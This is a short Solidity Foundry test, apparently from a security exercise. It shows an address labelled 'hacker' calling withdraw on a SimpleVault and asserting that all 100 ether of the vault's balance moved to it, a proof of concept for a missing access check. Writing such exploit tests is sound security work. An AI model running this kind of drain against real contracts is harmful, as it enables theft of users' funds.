// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/SimpleVault.sol";

contract SimpleVaultAttackTest is Test {
    SimpleVault public vault;
    address public hacker = address(0x1337);

    function setUp() public {
        vault = new SimpleVault();
        vm.deal(address(vault), 100 ether);
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        vault.withdraw(100 ether);
        vm.stopPrank();
        assertEq(hacker.balance, 101 ether);
        assertEq(address(vault).balance, 0);
    }
}
